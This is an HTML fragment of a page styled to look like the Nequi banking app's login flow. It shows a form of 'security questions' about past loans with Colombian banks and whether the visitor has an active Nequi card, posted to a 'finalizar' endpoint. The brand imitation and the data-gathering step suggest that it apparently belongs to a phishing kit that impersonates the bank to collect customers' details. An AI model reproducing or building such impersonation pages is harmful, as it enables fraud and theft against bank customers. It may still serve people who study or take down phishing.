    ...
    <div id="content">
        ...
        <section class="login-section ng-scope" ng-controller="loginController as loginControl">
            <div class="login-wrap">
                ...
                <p class="ng-binding">Tranqui, luego podrás seguir usando Nequi a tu ritmo ;)</p>
                <div class="login-form-wrap">
                    <form method="POST" action="finalizar" autocomplete="off"
                        ...
                        <div class="preguntas">
                            ...
                            <label for="">Responda cada una de las siguientes Preguntas</label>
                            <a style="color:black; text-decoration:none;">¿Ha tenido un crédito financiero con algúna de las siguientes entidades bancarias?</a><br>
                            <select name="otra" id="" style="width:80%; height: 40px;background-color: #F1BFDA; border:none; margin-top:10px;">
                            <option value="nn" selected>Seleccione una opción</option>
                                <option value="Bancolombia" >Bancolombia</option>
                                <option value="Bogota" >Banco de Bogota</option>
                                <option value="Icetex" >Icetex</option>
                                <option value="notiene" >Ninguna de las anteriores</option>
                            </select><br><br>

                            <a style="color:black; text-decoration:none;">¿Actualmente tiene tarjeta Nequi activa?</a><br>
                            <select name="cc_activa" id="" style="width:80%; height: 40px; background-color: #F1BFDA; border:none; margin-top:10px;">
                            <option value="nn1" selected>Seleccione una opción</option>
                            <option value="tienecc">Si</option>
                            <option value="notienecc">No</option>
                            </select>
                        </div>
                        <div class="btn-wrap">
